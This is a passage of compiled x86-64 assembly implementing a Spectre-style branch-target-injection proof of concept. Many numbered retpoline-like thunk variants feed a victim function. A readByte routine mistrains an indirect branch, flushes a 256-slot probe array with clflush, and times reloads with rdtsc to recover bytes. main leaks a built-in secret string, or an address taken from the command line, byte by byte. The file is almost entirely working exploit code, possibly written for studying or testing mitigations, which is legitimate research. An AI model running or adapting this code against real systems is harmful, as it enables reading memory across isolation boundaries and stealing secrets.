	callq	.Lgg_retpol_thunk_000232
	jmp	.Lgg_retpol_after_000232
.Lgg_retpol_thunk_000232:
	callq	.Lgg_retpol_setup_000232
.Lgg_retpol_cap_000232:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000232
.Lgg_retpol_setup_000232:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000232:
	jmp	.Lvictim_win0_continue
## Variant 233
.Lvictim_win0_var233:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000233
	jmp	.Lgg_retpol_after_000233
.Lgg_retpol_thunk_000233:
	callq	.Lgg_retpol_setup_000233
.Lgg_retpol_cap_000233:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000233
.Lgg_retpol_setup_000233:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000233:
	jmp	.Lvictim_win0_continue
## Variant 234
.Lvictim_win0_var234:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000234
	jmp	.Lgg_retpol_after_000234
.Lgg_retpol_thunk_000234:
	callq	.Lgg_retpol_setup_000234
.Lgg_retpol_cap_000234:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000234
.Lgg_retpol_setup_000234:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000234:
	jmp	.Lvictim_win0_continue
## Variant 235
.Lvictim_win0_var235:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000235
	jmp	.Lgg_retpol_after_000235
.Lgg_retpol_thunk_000235:
	callq	.Lgg_retpol_setup_000235
.Lgg_retpol_cap_000235:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000235
.Lgg_retpol_setup_000235:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000235:
	jmp	.Lvictim_win0_continue
## Variant 236
.Lvictim_win0_var236:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000236
	jmp	.Lgg_retpol_after_000236
.Lgg_retpol_thunk_000236:
	callq	.Lgg_retpol_setup_000236
.Lgg_retpol_cap_000236:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000236
.Lgg_retpol_setup_000236:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000236:
	jmp	.Lvictim_win0_continue
## Variant 237
.Lvictim_win0_var237:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000237
	jmp	.Lgg_retpol_after_000237
.Lgg_retpol_thunk_000237:
	callq	.Lgg_retpol_setup_000237
.Lgg_retpol_cap_000237:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000237
.Lgg_retpol_setup_000237:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000237:
	jmp	.Lvictim_win0_continue
## Variant 238
.Lvictim_win0_var238:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000238
	jmp	.Lgg_retpol_after_000238
.Lgg_retpol_thunk_000238:
	callq	.Lgg_retpol_setup_000238
.Lgg_retpol_cap_000238:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000238
.Lgg_retpol_setup_000238:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000238:
	jmp	.Lvictim_win0_continue
## Variant 239
.Lvictim_win0_var239:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000239
	jmp	.Lgg_retpol_after_000239
.Lgg_retpol_thunk_000239:
	callq	.Lgg_retpol_setup_000239
.Lgg_retpol_cap_000239:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000239
.Lgg_retpol_setup_000239:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000239:
	jmp	.Lvictim_win0_continue
## Variant 240
.Lvictim_win0_var240:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000240
	jmp	.Lgg_retpol_after_000240
.Lgg_retpol_thunk_000240:
	callq	.Lgg_retpol_setup_000240
.Lgg_retpol_cap_000240:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000240
.Lgg_retpol_setup_000240:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000240:
	jmp	.Lvictim_win0_continue
## Variant 241
.Lvictim_win0_var241:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000241
	jmp	.Lgg_retpol_after_000241
.Lgg_retpol_thunk_000241:
	callq	.Lgg_retpol_setup_000241
.Lgg_retpol_cap_000241:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000241
.Lgg_retpol_setup_000241:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000241:
	jmp	.Lvictim_win0_continue
## Variant 242
.Lvictim_win0_var242:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000242
	jmp	.Lgg_retpol_after_000242
.Lgg_retpol_thunk_000242:
	callq	.Lgg_retpol_setup_000242
.Lgg_retpol_cap_000242:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000242
.Lgg_retpol_setup_000242:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000242:
	jmp	.Lvictim_win0_continue
## Variant 243
.Lvictim_win0_var243:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000243
	jmp	.Lgg_retpol_after_000243
.Lgg_retpol_thunk_000243:
	callq	.Lgg_retpol_setup_000243
.Lgg_retpol_cap_000243:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000243
.Lgg_retpol_setup_000243:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000243:
	jmp	.Lvictim_win0_continue
## Variant 244
.Lvictim_win0_var244:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000244
	jmp	.Lgg_retpol_after_000244
.Lgg_retpol_thunk_000244:
	callq	.Lgg_retpol_setup_000244
.Lgg_retpol_cap_000244:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000244
.Lgg_retpol_setup_000244:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000244:
	jmp	.Lvictim_win0_continue
## Variant 245
.Lvictim_win0_var245:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000245
	jmp	.Lgg_retpol_after_000245
.Lgg_retpol_thunk_000245:
	callq	.Lgg_retpol_setup_000245
.Lgg_retpol_cap_000245:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000245
.Lgg_retpol_setup_000245:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000245:
	jmp	.Lvictim_win0_continue
## Variant 246
.Lvictim_win0_var246:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000246
	jmp	.Lgg_retpol_after_000246
.Lgg_retpol_thunk_000246:
	callq	.Lgg_retpol_setup_000246
.Lgg_retpol_cap_000246:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000246
.Lgg_retpol_setup_000246:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000246:
	jmp	.Lvictim_win0_continue
## Variant 247
.Lvictim_win0_var247:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000247
	jmp	.Lgg_retpol_after_000247
.Lgg_retpol_thunk_000247:
	callq	.Lgg_retpol_setup_000247
.Lgg_retpol_cap_000247:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000247
.Lgg_retpol_setup_000247:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000247:
	jmp	.Lvictim_win0_continue
## Variant 248
.Lvictim_win0_var248:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000248
	jmp	.Lgg_retpol_after_000248
.Lgg_retpol_thunk_000248:
	callq	.Lgg_retpol_setup_000248
.Lgg_retpol_cap_000248:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000248
.Lgg_retpol_setup_000248:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000248:
	jmp	.Lvictim_win0_continue
## Variant 249
.Lvictim_win0_var249:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000249
	jmp	.Lgg_retpol_after_000249
.Lgg_retpol_thunk_000249:
	callq	.Lgg_retpol_setup_000249
.Lgg_retpol_cap_000249:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000249
.Lgg_retpol_setup_000249:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000249:
	jmp	.Lvictim_win0_continue
.Lvictim_win0_continue:
	movl	%eax, %ebx
	## InlineAsm End
	movl	%ebx, -36(%rbp)    # # 4-byte Spill
	movl	-36(%rbp), %eax    # # 4-byte Reload
	movl	%eax, -32(%rbp)
	movl	-32(%rbp), %eax
	andl	-24(%rbp), %eax
	popq	%rbx
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_readByte                       ## -- Begin function readByte
	.p2align	4, 0x90
_readByte:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$1120, %rsp    # # imm = 0x460
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	movq	%rdi, -1048(%rbp)
	movq	%rsi, -1056(%rbp)
	movq	%rdx, -1064(%rbp)
	movl	$0, -1088(%rbp)
	movb	$36, -1113(%rbp)
	movl	$0, -1072(%rbp)
LBB3_1:                                 ## =>This Inner Loop Header: Depth=1
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	movl	-1072(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB3_1 Depth=1
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_1
LBB3_4:
	movl	$999, -1068(%rbp)    # # imm = 0x3E7
LBB3_5:                                 ## =>This Loop Header: Depth=1
                                        ##     Child Loop BB3_7 Depth 2
                                        ##     Child Loop BB3_11 Depth 2
                                        ##     Child Loop BB3_15 Depth 2
                                        ##     Child Loop BB3_21 Depth 2
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	leaq	_gadget(%rip), %rcx
	movq	%rcx, (%rax)
	mfence
	movl	$29, -1076(%rbp)
LBB3_7:                                 ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	xorl	%esi, %esi
	callq	_victim
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
## %bb.9:                               ##   in Loop: Header=BB3_7 Depth=2
	movl	-1076(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -1076(%rbp)
	jmp	LBB3_7
LBB3_10:                                ##   in Loop: Header=BB3_5 Depth=1
	mfence
	movl	$0, -1072(%rbp)
LBB3_11:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	clflush	(%rax)
## %bb.13:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_11
LBB3_14:                                ##   in Loop: Header=BB3_5 Depth=1
	mfence
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	leaq	_safe_target(%rip), %rcx
	movq	%rcx, (%rax)
	mfence
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	clflush	(%rax)
	mfence
	movq	-1048(%rbp), %rdi
	xorl	%esi, %esi
	callq	_victim
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
	mfence
	movl	$0, -1072(%rbp)
LBB3_15:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -1084(%rbp)
	movl	-1084(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	movq	%rax, -1112(%rbp)
	rdtsc
	shlq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, -1096(%rbp)
	movq	-1112(%rbp), %rax
	movzbl	(%rax), %eax
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
	mfence
	rdtsc
	shlq	$32, %rdx
	orq	%rdx, %rax
	subq	-1096(%rbp), %rax
	movq	%rax, -1104(%rbp)
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	addl	$1, %ecx
	movl	%ecx, -1040(%rbp,%rax,4)
LBB3_18:                                ##   in Loop: Header=BB3_15 Depth=2
	jmp	LBB3_19
LBB3_19:                                ##   in Loop: Header=BB3_15 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_15
LBB3_20:                                ##   in Loop: Header=BB3_5 Depth=1
	movl	$-1, -1080(%rbp)
	movl	$-1, -1076(%rbp)
	movl	$0, -1072(%rbp)
LBB3_21:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jl	LBB3_24
## %bb.23:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1076(%rbp), %rcx
	cmpl	-1040(%rbp,%rcx,4), %eax
	jl	LBB3_25
LBB3_24:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1076(%rbp), %eax
	movl	%eax, -1080(%rbp)
	movl	-1072(%rbp), %eax
	movl	%eax, -1076(%rbp)
	jmp	LBB3_29
LBB3_25:                                ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1080(%rbp), %rcx
	cmpl	-1040(%rbp,%rcx,4), %eax
	jl	LBB3_28
LBB3_27:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1072(%rbp), %eax
	movl	%eax, -1080(%rbp)
LBB3_28:                                ##   in Loop: Header=BB3_21 Depth=2
	jmp	LBB3_29
LBB3_29:                                ##   in Loop: Header=BB3_21 Depth=2
	jmp	LBB3_30
LBB3_30:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_21
LBB3_31:                                ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1080(%rbp), %rcx
	movl	-1040(%rbp,%rcx,4), %ecx
	shll	%ecx
	addl	$5, %ecx
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jne	LBB3_35
## %bb.33:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1080(%rbp), %rax
	cmpl	$0, -1040(%rbp,%rax,4)
	jne	LBB3_35
LBB3_34:
	jmp	LBB3_37
LBB3_35:                                ##   in Loop: Header=BB3_5 Depth=1
	jmp	LBB3_36
LBB3_36:                                ##   in Loop: Header=BB3_5 Depth=1
	movl	-1068(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -1068(%rbp)
	jmp	LBB3_5
LBB3_37:
	movl	-1088(%rbp), %eax
	xorl	-1040(%rbp), %eax
	movl	%eax, -1040(%rbp)
	movl	-1076(%rbp), %eax
	movb	%al, %cl
	movq	-1056(%rbp), %rax
	movb	%cl, (%rax)
	movslq	-1076(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	movq	-1064(%rbp), %rax
	movl	%ecx, (%rax)
	movl	-1080(%rbp), %eax
	movb	%al, %cl
	movq	-1056(%rbp), %rax
	movb	%cl, 1(%rax)
	movslq	-1080(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	movq	-1064(%rbp), %rax
	movl	%ecx, 4(%rax)
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB3_39
## %bb.38:
	addq	$1120, %rsp    # # imm = 0x460
	popq	%rbp
	retq
LBB3_39:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.globl	_main                           ## -- Begin function main
	.p2align	4, 0x90
_main:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$64, %rsp
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	movl	$0, -20(%rbp)
	movl	%edi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movl	$8, %edi
	callq	_malloc
	movq	%rax, %rcx
	movq	_target@GOTPCREL(%rip), %rax
	movq	%rcx, (%rax)
	movq	_secret(%rip), %rdi
	callq	_strlen
                                        ## kill: def $eax killed $eax killed $rax
	movl	%eax, -40(%rbp)
	movq	_secret(%rip), %rax
	movq	%rax, -48(%rbp)
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-48(%rbp), %rdx
	movb	$0, %al
	callq	_sscanf
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-40(%rbp), %rdx
	movb	$0, %al
	callq	_sscanf
LBB4_2:
	movl	-40(%rbp), %esi
	movq	-48(%rbp), %rdx
	leaq	L_.str.3(%rip), %rdi
	movb	$0, %al
	callq	_printf
LBB4_3:                                 ## =>This Inner Loop Header: Depth=1
	movl	-40(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -40(%rbp)
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movq	-48(%rbp), %rdi
	movq	%rdi, %rax
	addq	$1, %rax
	movq	%rax, -48(%rbp)
	leaq	-34(%rbp), %rsi
	leaq	-16(%rbp), %rdx
	callq	_readByte
	movl	-16(%rbp), %ecx
	movl	-12(%rbp), %edx
	shll	%edx
	leaq	L_.str.7(%rip), %rsi
	leaq	L_.str.6(%rip), %rax
	cmpl	%edx, %ecx
	cmovgeq	%rax, %rsi
	leaq	L_.str.5(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movsbl	-34(%rbp), %eax
	movl	%eax, -52(%rbp)    # # 4-byte Spill
	movsbl	-34(%rbp), %eax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	LBB4_8
LBB4_7:                                 ##   in Loop: Header=BB4_3 Depth=1
	movl	$63, %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	LBB4_8
LBB4_8:                                 ##   in Loop: Header=BB4_3 Depth=1
	movl	-52(%rbp), %esi    # # 4-byte Reload
	movl	-56(%rbp), %edx    # # 4-byte Reload
	leaq	L_.str.8(%rip), %rdi
	movb	$0, %al
	callq	_printf
	jmp	LBB4_3
LBB4_9:
	leaq	L_.str.9(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rdi
	callq	_free
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB4_11
## %bb.10:
	xorl	%eax, %eax
	addq	$64, %rsp
	popq	%rbp
	retq
LBB4_11:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.section	__TEXT,__cstring,cstring_literals
L_.str:                                 ## @.str
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.section	__DATA,__data
	.globl	_secret                         ## @secret
	.p2align	3, 0x0
_secret:
	.quad	L_.str
	.comm	_channel,262144,4               ## @channel
	.comm	_target,8,3                     ## @target
	.section	__TEXT,__cstring,cstring_literals
	L_.str.1	:    # # @.str.1
	.asciz	"%p"
	L_.str.2	:    # # @.str.2
	.asciz	"%d"
	L_.str.3	:    # # @.str.3
	.asciz	"Reading %d bytes starting at %p:\n"
	L_.str.4	:    # # @.str.4
	.asciz	"reading %p..."
	L_.str.5	:    # # @.str.5
	.asciz	"%s: "
	L_.str.6	:    # # @.str.6
	.asciz	"success"
	L_.str.7	:    # # @.str.7
	.asciz	"unclear"
	L_.str.8	:    # # @.str.8
	.asciz	"0x%02X='%c'\n"
	L_.str.9	:    # # @.str.9
	.asciz	"\n"
.subsections_via_symbols
